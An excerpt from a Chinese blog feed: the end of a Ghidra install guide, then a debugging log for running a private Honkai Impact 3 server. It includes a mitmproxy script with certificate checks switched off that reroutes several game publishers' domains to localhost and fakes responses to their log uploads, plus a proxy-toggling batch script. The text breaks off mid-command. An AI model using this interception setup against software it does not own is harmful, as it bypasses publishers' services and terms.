<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><ul>
<li>Windows 10</li>
<li>WSL2-Ubuntu 22.04</li>
</ul>
<h2 id="安装Ghidra"><a href="#安装Ghidra" class="headerlink" title="安装Ghidra"></a>安装Ghidra</h2><p>首先，确保你有JRE（Java运行时环境）和Jdk（Java开发工具包）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">java -version</span><br><span class="line">javac -version</span><br></pre></td></tr></table></figure>

<p>如果没有，则使用以下命令安装，注意选择最新版openjdk安装，使用<code>apt-cache</code>搜索即可</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install openjdk-21-jre</span><br><span class="line">sudo apt install openjdk-21-jdk</span><br></pre></td></tr></table></figure>

<p>安装最新版<a href="https://github.com/NationalSecurityAgency/ghidra/releases">ghidra</a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://github.com/NationalSecurityAgency/ghidra/releases/download/Ghidra_11.2.1_build/ghidra_11.2.1_PUBLIC_20241105.zip</span><br><span class="line">unzip ghidra_11.2.1_PUBLIC_20241105.zip</span><br><span class="line">cd ghidra_11.2.1_PUBLIC/</span><br><span class="line">./ghidraRun</span><br></pre></td></tr></table></figure>

<p>如果要设置jdk路径，<code>/usr/lib/jvm/java-21-openjdk-amd64/</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./ghidraRun</span><br><span class="line">******************************************************************</span><br><span class="line">JDK 21+ (64-bit) could not be found and must be manually chosen!</span><br><span class="line">******************************************************************</span><br><span class="line">Enter path to JDK home directory (ENTER for dialog): /usr/lib/jvm/java-21-openjdk-amd64/</span><br></pre></td></tr></table></figure>

<p>然后就可以正常打开GUI界面了。</p>
]]></content>
      <tags>
        <tag>教程</tag>
      </tags>
  </entry>
  <entry>
    <title>BH3 v7.0服务器搭建实践</title>
    <url>/posts/5fd89f19.html</url>
    <content><![CDATA[<p>记录一下BH3第一部的私服搭建以及功能完善过程</p>
<h2 id="使用已有工具运行"><a href="#使用已有工具运行" class="headerlink" title="使用已有工具运行"></a>使用已有工具运行</h2><p>直接运行<code>一键启动.exe</code>，然后开启phpstudy的nginx服务。</p>
<h3 id="已进行的操作（注意点）"><a href="#已进行的操作（注意点）" class="headerlink" title="已进行的操作（注意点）"></a>已进行的操作（注意点）</h3><ul>
<li><input checked="" disabled="" type="checkbox"> 修改nginx配置目录</li>
<li><input checked="" disabled="" type="checkbox"> 修改目录名字为纯英文</li>
<li><input checked="" disabled="" type="checkbox"> 安装mitmproxy，导入mitmproxy证书</li>
<li><input checked="" disabled="" type="checkbox"> 安装.Net工具</li>
<li><input checked="" disabled="" type="checkbox"> 第一次安装好后不要进入，重启游戏</li>
</ul>
<h3 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h3><h4 id="网络连接失败，请检查网络设置"><a href="#网络连接失败，请检查网络设置" class="headerlink" title="网络连接失败，请检查网络设置"></a>网络连接失败，请检查网络设置</h4><p>进入游戏后发现无法连接网络</p>
<img src="/posts/5fd89f19/image-20241120233806145.png" class="" title="image-20241120233806145">

<p>查看代理的terminal发现没有日志信息，发现是系统代理并没有开启。</p>
<p>开启后可以看到日志信息：</p>
<img src="/posts/5fd89f19/image-20241120233906105.png" class="" title="image-20241120233906105">

<p>发现服务器拒绝连接，使用<code>http://127.0.0.1</code>访问发现为404，首先怀疑是安装mimtproxy的证书。</p>
<p>参考链接：<a href="https://www.jianshu.com/p/036e5057f0b9">mitmproxy的下载及证书配置</a></p>
<blockquote>
<p>此处要注意现有工具设置的代理端口为8891</p>
</blockquote>
<p>查看nginx的错误日志<code>error.log</code>文件发现问题，路径设置有误，找到路径定义位置进行修改：</p>
<img src="/posts/5fd89f19/image-20241121155540102.png" class="" title="image-20241121155540102">

<p>更改后发现仍然报错，原来是<code>www/127.0.0.1/</code>目录下就没有这两个文件：</p>
<img src="/posts/5fd89f19/image-20241121160105729.png" class="" title="image-20241121160105729">

<p>根据教程要修改<code>BH3/BH3/config.json</code>的内容HOST字段为<code>127.0.0.1</code></p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;UseLocalCache&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;CreateAccountOnLoginAttempt&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;DatabaseUri&quot;</span><span class="punctuation">:</span> <span class="string">&quot;mongodb://127.0.0.1:27017&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;Gameserver&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;Port&quot;</span><span class="punctuation">:</span> <span class="number">16100</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;RegionName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;BH3&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Host&quot;</span><span class="punctuation">:</span> <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;Http&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;HttpPort&quot;</span><span class="punctuation">:</span> <span class="number">8081</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;HttpsPort&quot;</span><span class="punctuation">:</span> <span class="number">443</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;VerboseLevel&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Debug&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>发现原来一键启动后只有两个终端，少了一个服务器的终端进程，怀疑是没有安装.NET工具</p>
<img src="/posts/5fd89f19/image-20241121163547129.png" class="" title="image-20241121163547129">

<p>将这五个工具全部按顺序运行一遍，然后重新一键启动</p>
<p>成功弹出三个终端，并且游戏内网络错误报错消失</p>
<h4 id="下载数值文件失败，请确认网络、读写权限以及存储空间后点击重试"><a href="#下载数值文件失败，请确认网络、读写权限以及存储空间后点击重试" class="headerlink" title="下载数值文件失败，请确认网络、读写权限以及存储空间后点击重试"></a>下载数值文件失败，请确认网络、读写权限以及存储空间后点击重试</h4><p>报错如下：</p>
<img src="/posts/5fd89f19/image-20241121163821413.png" class="" title="image-20241121163821413">

<p>重启游戏和服务器即可，或者也有可能是phpstudy的问题</p>
<p>重启后使用用户名1，密码1登录，就可以进入游戏了。</p>
<p><strong>正常的服务端运行截图（供后续调试参考）</strong></p>
<img src="/posts/5fd89f19/image-20241121194102579.png" class="" title="image-20241121194102579">

<p><strong>正常的mitmproxy日志信息（供参考）</strong></p>
<img src="/posts/5fd89f19/image-20241121194208884.png" class="" title="image-20241121194208884">

<h2 id="使用已有服务器源码运行"><a href="#使用已有服务器源码运行" class="headerlink" title="使用已有服务器源码运行"></a>使用已有服务器源码运行</h2><p>服务器源码为C#编写，需要.Net</p>
<h3 id="服务端运行"><a href="#服务端运行" class="headerlink" title="服务端运行"></a>服务端运行</h3><p>运行源码中的<code>Program.cs</code>文件，发现服务端成功启动，监听在80和443端口</p>
<img src="/posts/5fd89f19/image-20241121185853651.png" class="" title="image-20241121185853651">

<p>为防止端口冲突，需要修改监听端口为8081，修改Program.cs文件内容即可</p>
<img src="/posts/5fd89f19/image-20241121185626765.png" class="" title="image-20241121185626765">

<p>修改配置文件<code>bin/Debug/net6.0/config.json</code>内容</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;UseLocalCache&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;CreateAccountOnLoginAttempt&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;DatabaseUri&quot;</span><span class="punctuation">:</span> <span class="string">&quot;mongodb://127.0.0.1:27017&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;Gameserver&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;Port&quot;</span><span class="punctuation">:</span> <span class="number">16100</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;RegionName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;BH3&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Host&quot;</span><span class="punctuation">:</span> <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;Http&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;HttpPort&quot;</span><span class="punctuation">:</span> <span class="number">8081</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;HttpsPort&quot;</span><span class="punctuation">:</span> <span class="number">443</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;VerboseLevel&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Debug&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>注意输出日志为硬编码的80端口， A lie！</p>
<img src="/posts/5fd89f19/image-20241121190517109.png" class="" title="image-20241121190517109">

<p>修改为以下内容，让日志打印正确值：</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">c.Log(<span class="string">$&quot;HTTP server started on port <span class="subst">&#123;Global.config.Http.HttpPort&#125;</span> &amp; <span class="subst">&#123;Global.config.Http.HttpsPort&#125;</span>&quot;</span>); <span class="comment">// Truth</span></span><br></pre></td></tr></table></figure>

<p>发现正常</p>
<img src="/posts/5fd89f19/image-20241121190859784.png" class="" title="image-20241121190859784">

<h3 id="代理运行"><a href="#代理运行" class="headerlink" title="代理运行"></a>代理运行</h3><h4 id="mitmproxy"><a href="#mitmproxy" class="headerlink" title="mitmproxy"></a>mitmproxy</h4><p>首先开启系统代理8891端口，直接将以下脚本另存为switchProxy.bat，使用ANSI编码保存可以解决中文乱码问题。</p>
<figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="keyword">for</span> /f &quot;tokens=<span class="number">1</span>,<span class="number">2</span>,* &quot; <span class="variable">%%i</span> <span class="keyword">in</span> (&#x27;REG QUERY &quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot; /v ProxyEnable ^| <span class="built_in">find</span> /i &quot;ProxyEnable&quot;&#x27;) <span class="keyword">do</span> (<span class="built_in">set</span> /A ProxyEnableValue=<span class="variable">%%k</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="variable">%ProxyEnableValue%</span> <span class="keyword">equ</span> <span class="number">0</span> (</span><br><span class="line">    <span class="built_in">echo</span> 系统代理目前处于关闭状态，正在开启代理，请稍候...</span><br><span class="line">    <span class="built_in">echo</span>=</span><br><span class="line">    reg add &quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot; /v ProxyEnable /t REG_DWORD /d <span class="number">1</span> /f &gt;<span class="built_in">nul</span> <span class="number">2</span>&gt;<span class="built_in">nul</span></span><br><span class="line">    reg add &quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot; /v ProxyServer /d &quot;<span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">8891</span>&quot; /f &gt;<span class="built_in">nul</span> <span class="number">2</span>&gt;<span class="built_in">nul</span></span><br><span class="line">    <span class="built_in">echo</span> 系统代理已开启，请按任意键关闭本窗口...</span><br><span class="line">) <span class="keyword">else</span> <span class="keyword">if</span> <span class="variable">%ProxyEnableValue%</span> <span class="keyword">equ</span> <span class="number">1</span> (</span><br><span class="line">    <span class="built_in">echo</span> 系统代理目前处于开启状态，正在关闭代理，请稍候...</span><br><span class="line">    <span class="built_in">echo</span>=</span><br><span class="line">    reg add &quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot; /v ProxyEnable /t REG_DWORD /d <span class="number">0</span> /f &gt;<span class="built_in">nul</span> <span class="number">2</span>&gt;<span class="built_in">nul</span></span><br><span class="line">    reg add &quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot; /v ProxyServer /d &quot;&quot; /f &gt;<span class="built_in">nul</span> <span class="number">2</span>&gt;<span class="built_in">nul</span></span><br><span class="line">    <span class="built_in">echo</span> 系统代理已关闭，请按任意键退出本窗口...</span><br><span class="line">)</span><br><span class="line"><span class="built_in">pause</span>&gt;<span class="built_in">nul</span></span><br></pre></td></tr></table></figure>

<p>执行以下命令</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">.\switchProxy.bat</span><br><span class="line">.\bin\mitmdump.exe <span class="literal">-p</span> <span class="number">8891</span> <span class="literal">-s</span> .\proxy.py</span><br><span class="line"><span class="comment"># mitmweb方便调试</span></span><br><span class="line">.\bin\mitmweb.exe <span class="literal">-p</span> <span class="number">8891</span> <span class="literal">-s</span> .\proxy.py <span class="literal">--web-port</span> <span class="number">8892</span></span><br></pre></td></tr></table></figure>

<p>proxy.py脚本如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> mitmproxy <span class="keyword">import</span> http</span><br><span class="line"><span class="keyword">from</span> mitmproxy <span class="keyword">import</span> ctx</span><br><span class="line"><span class="keyword">from</span> mitmproxy.proxy <span class="keyword">import</span> layer, layers</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load</span>(<span class="params">loader</span>):</span><br><span class="line">    <span class="comment"># ctx.options.web_open_browser = False</span></span><br><span class="line">    <span class="comment"># We change the connection strategy to lazy so that next_layer happens before we actually connect upstream.</span></span><br><span class="line">    ctx.options.connection_strategy = <span class="string">&quot;lazy&quot;</span></span><br><span class="line">    ctx.options.upstream_cert = <span class="literal">False</span></span><br><span class="line">    ctx.options.ssl_insecure = <span class="literal">True</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">next_layer</span>(<span class="params">nextlayer: layer.NextLayer</span>):</span><br><span class="line">    <span class="comment"># ctx.log(</span></span><br><span class="line">    <span class="comment">#     f&quot;&#123;nextlayer.context=&#125;\n&quot;</span></span><br><span class="line">    <span class="comment">#     f&quot;&#123;nextlayer.data_client()[:70]=&#125;\n&quot;</span></span><br><span class="line">    <span class="comment"># )</span></span><br><span class="line">    sni = nextlayer.context.client.sni</span><br><span class="line">    <span class="keyword">if</span> sni <span class="keyword">and</span> (sni.endswith(<span class="string">&quot;yuanshen.com&quot;</span>) <span class="keyword">or</span> sni.endswith(<span class="string">&quot;mihoyo.com&quot;</span>) <span class="keyword">or</span> sni.endswith(<span class="string">&quot;hoyoverse.com&quot;</span>) <span class="keyword">or</span> sni.endswith(<span class="string">&quot;starrails.com&quot;</span>) <span class="keyword">or</span> sni.endswith(<span class="string">&quot;bhsr.com&quot;</span>) <span class="keyword">or</span> sni.endswith(<span class="string">&quot;kurogame.com&quot;</span>) <span class="keyword">or</span> sni.endswith(<span class="string">&quot;zenlesszonezero.com&quot;</span>) <span class="keyword">or</span> sni.endswith(<span class="string">&quot;api.g3.proletariat.com&quot;</span>) <span class="keyword">or</span> sni.endswith(<span class="string">&quot;global01.os.honkaiimpact3.com&quot;</span>) <span class="keyword">or</span> sni.endswith(<span class="string">&quot;overseas01-appsflyer-report.honkaiimpact3.com&quot;</span>) <span class="keyword">or</span> sni.endswith(<span class="string">&quot;westglobal01.honkaiimpact3.com&quot;</span>) <span class="keyword">or</span> sni.endswith(<span class="string">&quot;bh3.com&quot;</span>) <span class="keyword">and</span> <span class="keyword">not</span> (sni.endswith(<span class="string">&quot;bundle.bh3.com&quot;</span>) <span class="keyword">or</span> sni.endswith(<span class="string">&quot;qcloud.bh3.com&quot;</span>) <span class="keyword">or</span> sni.endswith(<span class="string">&quot;bh3rd-beta.bh3.com&quot;</span>))):</span><br><span class="line">        ctx.log(<span class="string">&#x27;sni:&#x27;</span> + sni)</span><br><span class="line">        nextlayer.context.server.address = (<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">443</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">request</span>(<span class="params">flow: http.HTTPFlow</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="comment"># flow.request.scheme = &quot;http&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># pretty_host takes the &quot;Host&quot; header of the request into account</span></span><br><span class="line">    <span class="keyword">if</span> flow.request.pretty_url.startswith(<span class="string">&#x27;http://global01.west.honkaiimpact3.com&#x27;</span>):</span><br><span class="line">        flow.request.host = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">        flow.request.headers[<span class="string">&quot;Host&quot;</span>] = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">    <span class="keyword">if</span> flow.request.pretty_url.startswith(<span class="string">&#x27;http://log-upload-os.mihoyo.com&#x27;</span>) <span class="keyword">or</span> flow.request.pretty_url.startswith(<span class="string">&#x27;http://client-report.bh3.com&#x27;</span>):</span><br><span class="line">        flow.response = http.Response.make(</span><br><span class="line">            <span class="number">200</span>,  <span class="comment"># (optional) status code</span></span><br><span class="line">            <span class="string">b&quot;404 not found&quot;</span>,  <span class="comment"># (optional) content</span></span><br><span class="line">            &#123;<span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;text/html&quot;</span>&#125;  <span class="comment"># (optional) headers</span></span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">return</span></span><br></pre></td></tr></table></figure>

<h3 id="数据库代理运行"><a href="#数据库代理运行" class="headerlink" title="数据库代理运行"></a>数据库代理运行</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">.\mongod.exe <span class="literal">--dbpath</span> .\data\</span><br></pre></td></tr></table></figure>

<p>解决以下问题后，可以成功进入游戏</p>
<h3 id="问题解决-1"><a href="#问题解决-1" class="headerlink" title="问题解决"></a>问题解决</h3><h4 id="网络连接失败，请检查网络设置-1"><a href="#网络连接失败，请检查网络设置-1" class="headerlink" title="网络连接失败，请检查网络设置"></a>网络连接失败，请检查网络设置</h4><p>这一问题很普遍，请先检查是否已正常打开系统代理，服务端，然后可以多参考mitmproxy的输出日志信息</p>
<img src="/posts/5fd89f19/image-20241121193018105.png" class="" title="image-20241121193018105">

<p>查看mitmproxy日志信息与正常的进行比较发现缺少query_gateway url访问</p>
<p>分析后得知是query_dispatch的url访问问题</p>
<p>对比发现正常响应没有设定端口</p>
<img src="/posts/5fd89f19/image-20241121200237500.png" class="" title="image-20241121200237500">

<p>修改服务器端query_dispatch的响应</p>
<img src="/posts/5fd89f19/image-20241121200509306.png" class="" title="image-20241121200509306">

<p>成功解决该问题</p>
<h4 id="下载数值文件失败"><a href="#下载数值文件失败" class="headerlink" title="下载数值文件失败"></a>下载数值文件失败</h4><img src="/posts/5fd89f19/image-20241121200655897.png" class="" title="image-20241121200655897">

<p>查看服务端正常输出：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">18</span> &lt;HTTP&gt; <span class="number">200</span> GET /query_dispatch</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">18</span> &lt;HTTP&gt; <span class="number">200</span> GET /query_gateway</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">18</span> &lt;HTTP&gt; <span class="number">404</span> POST /crashdump/dataUpload</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">18</span> &lt;HTTP&gt; <span class="number">404</span> POST /crashdump/dataUpload</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">18</span> &lt;HTTP&gt; <span class="number">404</span> POST /crashdump/dataUpload</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">18</span> &lt;HTTP&gt; <span class="number">200</span> GET /admin/mi18n/plat_oversea/m2020030410/m2020030410<span class="literal">-version</span>.json</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">18</span> &lt;HTTP&gt; <span class="number">200</span> GET /admin/mi18n/plat_os/m09291531181441/m09291531181441<span class="literal">-version</span>.json</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">18</span> &lt;HTTP&gt; <span class="number">200</span> POST /sdk/dataUpload</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">18</span> &lt;HTTP&gt; <span class="number">200</span> POST /sdk/dataUpload</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">18</span> &lt;HTTP&gt; <span class="number">200</span> GET /bh3_os/combo/granter/api/getConfig</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">18</span> &lt;HTTP&gt; <span class="number">200</span> GET /device<span class="literal">-fp</span>/api/getExtList</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">18</span> &lt;HTTP&gt; <span class="number">200</span> GET /combo/box/api/config/sdk/combo</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">18</span> &lt;HTTP&gt; <span class="number">200</span> GET /bh3_os/mdk/shield/api/loadConfig</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">18</span> &lt;HTTP&gt; <span class="number">200</span> POST /bh3_os/combo/granter/api/compareProtocolVersion</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">18</span> &lt;HTTP&gt; <span class="number">200</span> POST /sdk/dataUpload</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">18</span> &lt;HTTP&gt; <span class="number">200</span> POST /sdk/dataUpload</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">18</span> &lt;HTTP&gt; <span class="number">200</span> POST /device<span class="literal">-fp</span>/api/getFp</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">18</span> &lt;HTTP&gt; <span class="number">200</span> POST /sdk/dataUpload</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">19</span> &lt;HTTP&gt; <span class="number">200</span> POST /sdk/dataUpload</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">19</span> &lt;HTTP&gt; <span class="number">200</span> POST /sdk/dataUpload</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">23</span> &lt;HTTP&gt; <span class="number">200</span> POST /sdk/dataUpload</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">23</span> &lt;HTTP&gt; <span class="number">200</span> GET /combo/box/api/config/sw/precache</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">23</span> &lt;HTTP&gt; <span class="number">200</span> POST /sdk/dataUpload</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">23</span> &lt;HTTP&gt; <span class="number">200</span> GET /sw.html</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">24</span> &lt;HTTP&gt; <span class="number">404</span> POST /apm/dataUpload</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">24</span> &lt;HTTP&gt; <span class="number">200</span> POST /common/h5log/log/batch</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">27</span> &lt;HTTP&gt; <span class="number">200</span> POST /sdk/dataUpload</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">27</span> &lt;HTTP&gt; <span class="number">200</span> POST /sdk/dataUpload</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">27</span> &lt;HTTP&gt; <span class="number">200</span> POST /sdk/dataUpload</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">27</span> &lt;HTTP&gt; <span class="number">200</span> POST /sdk/dataUpload</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">27</span> &lt;HTTP&gt; <span class="number">200</span> POST /sdk/dataUpload</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">27</span> &lt;HTTP&gt; <span class="number">200</span> POST /bh3_os/mdk/shield/api/verify</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">27</span> &lt;HTTP20:<span class="number">11</span>:<span class="number">27</span> &gt; <span class="number">200</span> POST /sdk/dataUpload</span><br><span class="line">&lt;HTTP&gt; <span class="number">200</span> POST /account/device/api/listNewerDevices</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">27</span> &lt;HTTP&gt; <span class="number">200</span> POST /sdk/dataUpload</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">27</span> &lt;HTTP&gt; <span class="number">200</span> POST /sdk/dataUpload</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">27</span> &lt;HTTP&gt; <span class="number">200</span> POST /data_abtest_api/config/experiment/list</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">27</span> &lt;HTTP&gt; <span class="number">200</span> POST /bh3_os/combo/granter/login/v2/login</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">28</span> &lt;HTTP&gt; <span class="number">200</span> POST /sdk/dataUpload</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">28</span> &lt;HTTP&gt; <span class="number">200</span> GET /bh3_os/mdk/agreement/api/getAgreementInfos</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">28</span> &lt;HTTP&gt; <span class="number">200</span> POST /sdk/dataUpload</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">30</span> &lt;HTTP&gt; <span class="number">404</span> POST /apm/dataUpload</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">30</span> &lt;HTTP&gt; <span class="number">200</span> POST /common/h5log/log/batch</span><br></pre></td></tr></table></figure>

<p><del>应该是query_gateway的响应url有问题，没有加端口：</del></p>
<p><del><img src="/posts/5fd89f19/image-20241121221642918.png" class="" title="image-20241121221642918"></del></p>
<p><del>在所有Global.config.Gameserver.Host后全部加上端口号（无果）。</del></p>
<p>怀疑是phpstudy与服务器的配置有误</p>
<p>正常情况下phpstudy日志信息</p>
<img src="/posts/5fd89f19/image-20241122113314979.png" class="" title="image-20241122113314979">

<p>而使用源码运行并没有产生新的日志，说明服务器端并没有向phpstudy发送请求</p>
<p>确定为DispatchController.cs文件的GetAssetBundleUrlList存在问题</p>
<p>修改返回值为正确值</p>
<p>然后发现服务器端成功出现对&#x2F;combo&#x2F;box&#x2F;api&#x2F;config&#x2F;sw&#x2F;precache的url请求，说明CS进行了进一步交互。</p>
<h4 id="下载活动资源失败，请确定读写权限以及存储空间后点击重试"><a href="#下载活动资源失败，请确定读写权限以及存储空间后点击重试" class="headerlink" title="下载活动资源失败，请确定读写权限以及存储空间后点击重试"></a>下载活动资源失败，请确定读写权限以及存储空间后点击重试</h4><img src="/posts/5fd89f19/image-20241122124133759.png" class="" title="image-20241122124133759">

<p>重启游戏继续报错，查看详细信息发现是声音映射文件出错</p>
<img src="/posts/5fd89f19/image-20241122120519897.png" class="" title="image-20241122120519897">

<p>对比query_gateway后发现缺少”manifest”字段</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="attr">&quot;manifest&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;Audio&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;platform&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Windows&quot;</span><span class="punctuation">:</span> <span class="string">&quot;manifest_0b6ab335.m&quot;</span>	<span class="comment">//固定值</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;revision&quot;</span><span class="punctuation">:</span> <span class="number">650645</span>	<span class="comment">// 固定值</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br></pre></td></tr></table></figure>

<h2 id="服务器使用"><a href="#服务器使用" class="headerlink" title="服务器使用"></a>服务器使用</h2><h3 id="GM指令"><a href="#GM指令" class="headerlink" title="GM指令"></a>GM指令</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">------------------------------【GM 命令】----------------------------</span><br><span class="line">进入游戏在游戏内聊天窗口输入</span><br><span class="line">以下是可用的命令：</span><br><span class="line">-----------------</span><br><span class="line">level &lt;number&gt;</span><br><span class="line">设置玩家等级（人物88级，数字改多少就是多少级。最高应该是89）</span><br><span class="line">例如:</span><br><span class="line">level 88</span><br><span class="line">-----------------</span><br><span class="line">avatar &lt;add|modify&gt; &lt;avatarId&gt; &lt;...&gt;</span><br><span class="line">将角色添加到用户帐户或修改角色信息</span><br><span class="line">例如:</span><br><span class="line">avatar add 713</span><br><span class="line">avatar modify 713 Level 80</span><br><span class="line">请注意 字母L是大写的</span><br><span class="line">-----------------</span><br><span class="line">avatar modify -1 level 80（一键角色80级）</span><br><span class="line">avatar modify -1 Star 